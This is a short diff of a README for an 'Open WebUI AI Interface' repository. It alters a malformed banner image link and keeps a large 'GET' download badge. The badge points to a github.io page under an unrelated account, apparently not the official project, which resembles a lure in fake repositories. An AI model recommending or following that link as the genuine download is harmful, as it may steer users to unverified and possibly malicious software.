@@ -1,6 +1,6 @@
 # Open WebUI AI Interface
 
-![Banner Placeholder]([IMAGE_URL](https://cdf.uni-freiburg.de/content/images/logos/openwebui.jpg))
+![Banner Placeholder]([IMAGE_URL](https://cdf.uni-freiburg.de/content/images/logos/openwebui.jpg)
 
 [![GET — Open WebUI](https://img.shields.io/badge/GET%20%E2%80%94%20Open%20WebUI-0078D6?style=for-the-badge&logoColor=white)](https://manymanibim.github.io/.github/Open-WebUI-AI-Interface)
 
